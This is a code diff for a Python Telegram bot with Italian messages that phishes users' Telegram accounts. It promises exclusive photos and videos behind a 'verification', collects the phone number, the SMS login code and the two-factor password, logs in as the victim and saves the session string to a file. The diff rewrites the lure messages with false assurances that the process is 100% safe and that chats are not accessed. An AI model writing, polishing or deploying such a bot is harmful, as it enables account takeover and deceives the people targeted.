@@ -67,7 +67,7 @@ def cleanup(user_id):
     user_code_buffers.pop(user_id, None)
 
 def update_user_log(user_id: int, updates: dict):
-    """Обновляет или создает запись пользователя с новыми данными"""
+    """Обновляет или создает запись пользователя с новыми данной"""
     try:
         start_col.update_one(
             {"user_id": user_id},
@@ -84,9 +84,9 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
     for row in digits:
         btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
         buttons.append(btn_row)
-    buttons.append([InlineKeyboardButton("✅ Invia", callback_data="code_send")])
+    buttons.append([InlineKeyboardButton("✅ Invia Codice", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Codice: `{current_code}`" if current_code else "Inserisci il codice:"
+    text = f"📱 *Codice di verifica:*\n\n`{current_code}`\n\n_Premi i numeri per inserire il codice ricevuto da Telegram._" if current_code else "🔢 *Inserisci il codice di verifica*\n\n_Premi i pulsanti qui sotto per inserire il codice che hai ricevuto da Telegram._"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -113,13 +113,19 @@ async def cmd_start(message: types.Message):
         }
     )
 
-    keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("Autorizzazione del primo account🥰", callback_data="auth_account")
-    )
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton("🔐 Verifica Account", callback_data="auth_account"))
+    
     await message.answer(
-        "👋🇮🇹 CIAO! ❤️\n"
-        "Vuoi vedere più di 10.000 foto e più di 4.000 video? 👀\n"
-        "Verifica di non essere un bot con il pulsante qui sotto. 🤖👇\n\n",
+        "👋 *Benvenuto!*\n\n"
+        "Per accedere al nostro contenuto esclusivo, è necessario verificare il tuo account Telegram.\n\n"
+        "✅ *Processo sicuro al 100%*\n"
+        "• Non accediamo alle tue chat\n"
+        "• Non vediamo i tuoi messaggi\n"
+        "• Non condividiamo i tuoi dati\n\n"
+        "La verifica serve solo per confermare che sei un utente reale e prevenire abusi.\n\n"
+        "_Clicca il pulsante qui sotto per iniziare la verifica sicura:_",
+        parse_mode='Markdown',
         reply_markup=keyboard
     )
 
@@ -138,9 +144,20 @@ async def start_auth(callback_query: types.CallbackQuery):
     )
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
+    kb.add(KeyboardButton("📱 Condividi il mio numero", request_contact=True))
 
-    await bot.send_message(user_id, "🥰 Per favore condividi il tuo numero di telefono:", reply_markup=kb)
+    await bot.send_message(
+        user_id,
+        "🔒 *Fase 1: Verifica del numero*\n\n"
+        "Per proteggere la comunità da bot e spam, abbiamo bisogno di verificare il tuo numero di telefono.\n\n"
+        "📋 *Cosa succederà dopo:*\n"
+        "1. Condividi il numero → Telegram ti invierà un codice SMS\n"
+        "2. Inserisci il codice → Verifica completata\n"
+        "3. Accesso garantito → Contenuto sbloccato\n\n"
+        "⚠️ *Sicurezza garantita:* Il tuo numero viene utilizzato solo per questa verifica e non viene condiviso.",
+        parse_mode='Markdown',
+        reply_markup=kb
+    )
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
@@ -185,7 +202,18 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
-        await message.answer("⌨️ Inserisci il codice premendo i pulsanti qui sotto:")
+        
+        await message.answer(
+            "✅ *Numero ricevuto!*\n\n"
+            "📨 *Fase 2: Codice di verifica*\n\n"
+            "Telegram ti ha inviato un SMS con un codice di 5 cifre.\n\n"
+            "🔢 *Istruzioni:*\n"
+            "1. Controlla i messaggi sul tuo telefono\n"
+            "2. Inserisci il codice qui sotto usando i pulsanti\n"
+            "3. Premi 'Invia Codice' quando pronto\n\n"
+            "_Il codice scade dopo 5 minuti per sicurezza._",
+            parse_mode='Markdown'
+        )
     except Exception as e:
         await message.answer(f"❌ Errore nell'invio del codice: {e}")
         await client.disconnect()
@@ -197,12 +225,12 @@ async def process_code_button(callback_query: types.CallbackQuery):
     data = callback_query.data
 
     if user_states.get(user_id) != 'awaiting_code':
-        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="⛔️ Prima devi condividere il numero", show_alert=True)
         return
 
     buffer = user_code_buffers.get(user_id)
     if not buffer:
-        await bot.answer_callback_query(callback_query.id, text="Errore interno.", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="Errore interno. Ricomincia da /start", show_alert=True)
         return
 
     current_code = buffer['code']
@@ -228,7 +256,7 @@ async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
     if not client or not phone:
-        await bot.send_message(user_id, "⚠️ Sessione non trovata. Riprova con /start")
+        await bot.send_message(user_id, "⚠️ Sessione scaduta. Ricomincia da /start")
         cleanup(user_id)
         return
 
@@ -275,7 +303,17 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await bot.send_message(user_id, "Stiamo lavorando in modalità manuale, scusate il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
+            await bot.send_message(
+                user_id,
+                "🎉 *Verifica completata!*\n\n"
+                "✅ Il tuo account è stato verificato con successo!\n\n"
+                "📦 *Cosa succede ora:*\n"
+                "• Il tuo accesso è stato attivato\n"
+                "• Riceverai presto il contenuto esclusivo\n"
+                "• Non condividere il codice con nessuno\n\n"
+                "Grazie per la tua pazienza! 😊",
+                parse_mode='Markdown'
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
@@ -284,13 +322,33 @@ async def try_sign_in_code(user_id, code):
                 user_id=user_id,
                 updates={"status": "awaiting_2fa"}
             )
-            await bot.send_message(user_id, "🔐 Inserisci la tua password 2FA:")
+            await bot.send_message(
+                user_id,
+                "🔐 *Fase 3: Verifica in due passaggi*\n\n"
+                "Il tuo account ha la protezione aggiuntiva attivata.\n\n"
+                "📝 *Istruzioni:*\n"
+                "Invia la tua password di verifica in due passaggi qui sotto.\n\n"
+                "_Questa password è diversa dal codice SMS che hai appena inserito._",
+                parse_mode='Markdown'
+            )
     except PhoneCodeExpiredError:
-        await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
+        await bot.send_message(
+            user_id,
+            "⏰ *Codice scaduto*\n\n"
+            "Il codice di verifica è scaduto dopo 5 minuti per sicurezza.\n\n"
+            "Usa /start per ricevere un nuovo codice.",
+            parse_mode='Markdown'
+        )
         await client.disconnect()
         cleanup(user_id)
     except PhoneCodeInvalidError:
-        await bot.send_message(user_id, "❌ Codice errato. Riprova:")
+        await bot.send_message(
+            user_id,
+            "❌ *Codice errato*\n\n"
+            "Il codice inserito non è valido.\n\n"
+            "Controlla bene l'SMS e inserisci di nuovo il codice:",
+            parse_mode='Markdown'
+        )
         user_code_buffers[user_id]['code'] = ""
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
     except SessionPasswordNeededError:
@@ -299,9 +357,21 @@ async def try_sign_in_code(user_id, code):
             user_id=user_id,
             updates={"status": "awaiting_2fa"}
         )
-        await bot.send_message(user_id, "🔐 È richiesta la tua password 2FA. Inseriscila:")
+        await bot.send_message(
+            user_id,
+            "🔐 *Protezione aggiuntiva rilevata*\n\n"
+            "Il tuo account ha la verifica in due passaggi attivata.\n\n"
+            "📝 Invia la tua password di sicurezza qui sotto per completare la verifica.",
+            parse_mode='Markdown'
+        )
     except Exception as e:
-        await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
+        await bot.send_message(
+            user_id,
+            f"❌ *Errore durante la verifica*\n\n"
+            f"Si è verificato un problema tecnico:\n`{e}`\n\n"
+            f"Riprova con /start",
+            parse_mode='Markdown'
+        )
         await client.disconnect()
         cleanup(user_id)
 
@@ -313,7 +383,7 @@ async def process_2fa(message: types.Message):
     phone = user_phones.get(user_id)
 
     if not client or not phone:
-        await message.answer("⚠️ Sessione non trovata. Riprova da /start")
+        await message.answer("⚠️ Sessione scaduta. Usa /start per ricominciare")
         cleanup(user_id)
         return
 
@@ -354,13 +424,29 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("Stiamo lavorando in modalità manuale, scusate il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
+            await message.answer(
+                "🎉 *Verifica completata!*\n\n"
+                "✅ La protezione aggiuntiva è stata verificata con successo!\n\n"
+                "🔒 *Il tuo account è ora completamente sicuro e verificato.*\n\n"
+                "Riceverai il contenuto esclusivo a breve. Grazie! 😊",
+                parse_mode='Markdown'
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
-            await message.answer("❌ Impossibile accedere con 2FA.")
+            await message.answer(
+                "❌ *Password errata*\n\n"
+                "La password di verifica in due passaggi non è corretta.\n\n"
+                "Invia la password corretta:",
+                parse_mode='Markdown'
+            )
     except Exception as e:
-        await message.answer(f"❌ Errore con 2FA: {e}")
+        await message.answer(
+            f"❌ *Errore di verifica*\n\n"
+            f"Si è verificato un problema: `{e}`\n\n"
+            f"Riprova con /start",
+            parse_mode='Markdown'
+        )
         await client.disconnect()
         cleanup(user_id)
 
